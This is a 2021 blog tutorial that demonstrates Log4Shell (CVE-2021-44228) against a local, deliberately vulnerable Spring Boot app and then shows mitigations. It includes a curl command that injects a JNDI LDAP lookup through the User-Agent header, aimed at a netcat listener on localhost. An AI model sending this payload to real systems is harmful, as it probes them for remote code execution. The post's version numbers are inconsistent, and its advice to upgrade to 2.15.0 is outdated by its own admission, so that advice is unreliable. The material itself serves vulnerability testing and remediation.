---
layout: post
title:  "Demonstration of Log4Shell Exploit"
date:   2021-12-12 20:56:00 -0400
categories: hacking vulnerabilities
logo: log4j.jpg
---

A [Critical Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) was discovered in the Apache Log4j package.
Also known as Log4Shell, this vulnerability has wide-ranging impacts as Log4j is VERY widely used by many Java applications and dependent
libraries, causing almost every technology company around the world to scramble and patch their systems. This post attempts to detail a
way to test the vulnerability to help users better understand how the exploit functions so that they can be better equipped to solve for
the issue and protect their infrastructure. This IS NOT intended to be used in a malicious manner - it is ONLY an educational post.

## Background

**WARNING**: This article is largely out of date regarding the correct version to upgrade log4j to and the outstanding CVEs. Please consult
the official CVE site to learn more about the recommended version to upgrade log4j to.

The Log4Shell vulnerability is a Remote Code Execution (RCE) vulnerability that allows an attacker to inject and execute arbitrary code loaded
from an LDAP server when JNDI message lookup is enabled and user-provided parameters are passed to the logging framework. As an example, the
user can provide (for example) an LDAP URI via the `User-Agent` parameter in web requests that point to an attacker-controlled LDAP server, which
will respond with a malicious binary that is then loaded by the Log4j library, allowing for things such as a remote shell. At this point, the
attacker could obtain full control of your infrastructure and do severe damage.

As of this post, impacted versions of Log4j are 2.0 up through and including 2.14.1.

This post attempts to provide a test framework that demonstrates how to execute such an attack as a *learning tool only*. The more you know, the
better equipped you are to handle such situations, so the code and methods listed in this tutorial are for educational purposes only, and no
responsibility will be assumed for malicious use of this code.

## Java Example Application

The example application is built off the [Spring Boot Hello World Example](https://mkyong.com/spring-boot/spring-boot-hello-world-example/) code.
In addition to the starter code with embedded web server, an explicit log4j package has been included and is being used to demonstrate the
vulnerability.

Before we get started - take note - this testing can be RISKY as you are downloading artifacts of log4j that are susceptible to the vulnerability.
Take great care in isolating your test environment and NEVER run this in a production setting as you will be exposing yourself to the vulnerability
and potential great harm!

To get started, clone the repository with the example application:

```bash
$ git clone https://github.com/jekhokie/scriptbox.git
$ cd scriptbox/java--spring-boot-webapp-log4shell-test/log4shell-app-2.8.2-vulnerable/
```

The `pom.xml` file contains a dependency in it referencing `log4j-core` version 2.13.0 - the `log4j-core` package is where the JNDI lookup
functionality exists so we will only concern ourselves with bringing along this library for our testing.

To start the web application, run the command `mvn spring-boot:run` - you should see a Spring Boot web application launch and be able to access
it from your browser via URL [http://localhost:8080](http://localhost:8080/).

Now that we have the application running, let's start netcat and attempt to exploit the vulnerability. In a separate terminal window, lauch
netcat using `nc -l 10250`, which will create a listener on port 10250. Keep this tab open/visible.

Finally, let's send a request to the Spring Boot Java application and attempt to trigger an LDAP interaction. Send the following request from
the command line in a new terminal window - this will attempt to send a request with a spoofed User Agent property set to the JNDI LDAP lookup
parameter to your Spring Boot application running on port 8080. The port for the LDAP interaction is set to 10250, which is the port that the
netcat listener is running on:

```bash
$ curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:10250/a}' localhost:8080
```

If when sending the command your running Spring Boot application appears to "hang" (as does your curl request), check your netcat terminal window.
If you see garbage characters displayed, you have successfully exploited the log4j version running in the application.

## Where to Go From Here?

Now that you've tested and successfully proven the log4j version running in the sample application (2.13.1 - check the `pom.xml` file) is vulnerable,
let's attempt a fix. The remediation is to upgrade the version of log4j to 2.15.0 which has the correct version. There are other alternative methods
to mitigate the issue if that is problematic, but it should be noted that upgrading to Log4j 2.15.0 is the *safest* way to ensure that your applications
are fully protected. Let's try a couple methods.

### Applying nolookups to XML

First, updaing all `%m`, `%msg`, and `%message` directives in the custom Log4j XML file is the recommended mitigation for certain versions of Log4j (see
notes online). These entries must be updated to read `%m{nolookups}`, `%msg{nolookups}`, and `%message{nolookups}`, respectively. Stop all your running
applications and edit the Java Spring Boot application `src/main/resources/log4j2.xml` file to update all references as noted below:

- `%m` -> `%m{nolookups}`
- `%msg` -> `%msg{nolookups}`
- `%message` -> `%message{nolookups}`

Once the above have been updated, re-launch the Spring Boot application and netcat instance per the previous tutorial. Attempt to send the same curl
request - if all goes well, you should not receive any connectivity to the running netcat instance, demonstrating that the issue has been mitigated.

### Upgrading to Log4j 2.15.0

As noted, the *recommended* remediation is to upgrade the Log4j package to version 2.15.0. Edit the `pom.xml` file to update the `log4j2 version` property
to read `2.15.0`. Once done, re-launch the application using `mvn spring-boot:run` and re-launch your netcat listener. Re-attempt to send a curl command
again - note that you should not receive any connectivity to the running netcat instance, indicating you've successfully remediated the issue!

## Summing Up

As of this article, there are 2(ish) mitigation methods and 1 remediation method recommended for preventing impact by this vulnerability. This article
reviewed 1 of the mitigation methods and the recommended remediation method. For more information on additional ways to prevent exposure/risk and read
more about the vulnerability specifically, refer to the excellent [lunasec](https://www.lunasec.io/docs/blog/log4j-zero-day/) article on the log4j Zero
Day exploit.

### Credit

The above tutorial was pieced together with some information from the following sites/resources, among others that were likely missed in this list:

- [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
- [Critical vulnerability in Apache log4j library](https://www.kaspersky.com/blog/log4shell-critical-vulnerability-in-apache-log4j/43124/)
- [Spring Boot Hello World Example](https://mkyong.com/spring-boot/spring-boot-hello-world-example/)
- [Log4j2 in a Maven Project: How to Setup, Configure, and Use](https://www.sentinelone.com/blog/maven-log4j2-project/)
- [Spring boot log4j2.xml example](https://howtodoinjava.com/spring-boot2/logging/spring-boot-log4j2-config/)
- [Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package](https://www.lunasec.io/docs/blog/log4j-zero-day/)
